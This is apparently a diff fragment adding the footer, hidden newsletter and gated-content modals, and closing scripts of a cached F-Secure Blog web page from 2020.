+                    <li>
+                <a href="https://twitter.com/FSecure">
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                    <span class="c-social-media__service">twitter</span>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.instagram.com/fsecureglobal/">
+                    <i class="fab fa-instagram" aria-hidden="true"></i>
+                    <span class="c-social-media__service">instagram</span>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.linkedin.com/company/f-secure-corporation/">
+                    <i class="fab fa-linkedin" aria-hidden="true"></i>
+                    <span class="c-social-media__service">linkedin</span>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.youtube.com/user/FSecureNews">
+                    <i class="fab fa-youtube" aria-hidden="true"></i>
+                    <span class="c-social-media__service">youtube</span>
+                </a>
+            </li>
+                    <li>
+                <a href="https://www.youtube.com/c/FSecureConnectedLife?sub_confirmation=1">
+                    <i class="fab fa-youtube" aria-hidden="true"></i>
+                    <span class="c-social-media__service">youtube</span>
+                </a>
+            </li>
+            </ul>
+
+</div>
+        </div>
+
+    </div>
+    
+    <div class="b-footer__container">
+
+        <div class="b-footer__copyright">
+            <div>
+                Copyright 2020 F-Secure Blog            </div>
+
+            <div>
+                                                            </div>
+
+        </div>
+
+    </div>
+
+</footer><!-- end of footer -->
+
+<modals>
+
+    
+            <a href="#newsletter-modal" class="h-hidden js-trigger-newsletter-modal" data-swiss-modal="inline">Newsletter modal</a>
+        <div id="newsletter-modal" class="h-hidden">
+            <p>Thank you for your interest towards F-Secure newsletter. You will shortly get an email to confirm the subscription.</p>
+        </div>
+    
+            <a href="#gatedcontent-modal" class="h-hidden js-trigger-gatedcontent-modal" data-swiss-modal="inline">Gated Content modal</a>
+        <div id="gatedcontent-modal" class="h-hidden">
+            <p>Congratulations &#8211; You can now access the content by clicking the button below.</p>
+        </div>
+    
+</modals><script type='text/javascript' src='https://blog.f-secure.com/wp-content/themes/swiss/assets/dist/js/bundle.js?v=1600334030' id='swiss-js-js'></script>
+<script>
+window.apiGatewayUrl = "https://90tm3tokkh.execute-api.eu-central-1.amazonaws.com/test?";
+window.currentLanguage = "en";
+</script>
+</body>
+</html>
+
+<!-- Dynamic page generated in 0.856 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2020-10-26 09:45:29 -->
+
+<!-- super cache -->
